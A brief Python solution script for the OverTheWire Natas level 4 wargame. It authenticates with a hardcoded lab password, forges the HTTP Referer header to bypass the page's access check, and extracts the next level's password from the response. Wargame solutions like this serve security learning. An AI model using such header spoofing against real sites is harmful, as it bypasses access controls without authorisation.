import requests

url="http://natas4.natas.labs.overthewire.org/"
username="natas4"
password="tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm"

response = requests.get(url, auth=(username, password), headers={'referer': 'http://natas5.natas.labs.overthewire.org/'})
# print(response.text)
str="natas5"
for line in response.text.splitlines():
    if str in line:
        l=line.split()
        print(l[7])
# str="natas4"
# print(response.text.split(":")[1])